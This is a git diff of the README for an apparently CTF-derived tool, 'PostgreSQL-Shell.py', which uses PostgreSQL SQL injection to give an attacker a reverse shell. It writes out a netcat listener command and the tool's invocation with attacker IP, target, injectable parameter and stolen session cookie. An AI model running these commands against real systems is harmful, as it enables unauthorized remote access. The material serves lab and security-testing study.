@@ -13,24 +13,37 @@ It provides reverse shell connection to the attacker by mainly doing the followi
 
 This is to be used for educational and security testing purposes only and I'm not responsible for the misuse of this program.
 
-## ORIGINAL SOURCE
-https://www.aldeid.com/wiki/HackTheBox-StartingPoint-Vaccine
 
+## REQUIREMENTS
+The attacker must have been authenticated, and have obtained the session cookie.
+
+
+## ORIGINAL SOURCE
+https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection  
+https://www.aldeid.com/wiki/HackTheBox-StartingPoint-Vaccine  
 Modifier: lkim94
 
+
 ## CAUTION
-The shell disconnects when there's a few minutes of inactivity.
-Terminating this program's process while the shell is active can also cause unexpected disconnection.
+The shell disconnects when there's a few minutes of inactivity.  
+Terminating this program's process while the shell is active can also cause unexpected disconnection, and improper houseclean.
+
 
 ## USAGE
-1. `nc -lvnp <listen_port#>`
 
-![PostgreSQL-ShellyPoC1](https://user-images.githubusercontent.com/83319068/130559443-c6f3554e-2a73-41a9-bb38-603e912230be.png)
+1. Set up a listener --- `nc -lvnp <listen_port#>`  
+2. Run the program from another terminal window --- `python3 PostgreSQL-Shell.py -L <attacker_ip> -l <listen_port#> -t <target_ip> -p <url_parameter> -c <cookie>`  
 
-2. `python3 PostgreSQL-Shell.py -L <attacker_ip> -l <listen_port#> -t <target_ip> -p <url_parameter> -c <cookie>`
-
-![PostgreSQL-ShellyPoC2](https://user-images.githubusercontent.com/83319068/130559455-4b39932e-c68f-4cdf-bdfd-c178b7355f08.png)
-![PostgreSQL-ShellyPoC3](https://user-images.githubusercontent.com/83319068/130559467-07d92f93-db36-43a7-8243-b8e5444b8733.png)
 
 ## EXAMPLE
-`python3 PostgreSQL-Shell.py -L 10.10.14.44 -l 4444 -t 10.10.10.46 -p dashboard.php?search=car -c PHPSESSID=akebd2jzejfk47n3n3xucj4vem`
+1. Setting up a listener.  
+![PostgreSQL-ShellyPoC1](https://user-images.githubusercontent.com/83319068/130559443-c6f3554e-2a73-41a9-bb38-603e912230be.png)
+
+2. Running the program.  
+![PostgreSQL-ShellyPoC2](https://user-images.githubusercontent.com/83319068/130880953-d5545818-00f2-419f-94bd-033b516c7048.png)
+
+3. Shell spawning on the listener.  
+![PostgreSQL-ShellyPoC3](https://user-images.githubusercontent.com/83319068/130880966-17760935-4a43-4144-ae92-b6ccf5e3396c.png)
+
+4. Program quitting by performing houseclean.  
+![PostgreSQL-ShellyPoC4](https://user-images.githubusercontent.com/83319068/130880971-b16b4c38-9818-45e3-a1f9-972e8687dd45.png)
